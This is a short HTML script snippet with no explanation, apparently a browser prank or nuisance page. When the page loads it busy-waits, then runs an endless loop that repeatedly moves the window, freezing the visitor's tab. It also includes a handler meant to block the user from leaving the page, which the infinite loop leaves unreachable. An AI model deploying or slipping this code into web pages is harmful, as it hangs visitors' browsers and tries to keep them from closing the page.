<script>
window.onload = function() {
function sleep(waitMsec) {
var startMsec = new Date();
while (new Date() - startMsec < waitMsec);}
sleep(3000);
while(true){while(true){
window.moveBy(0, -20);}
window.addEventListener('beforeunload', function (event){
event.preventDefault()
event.returnValue = ''})}}
</script>
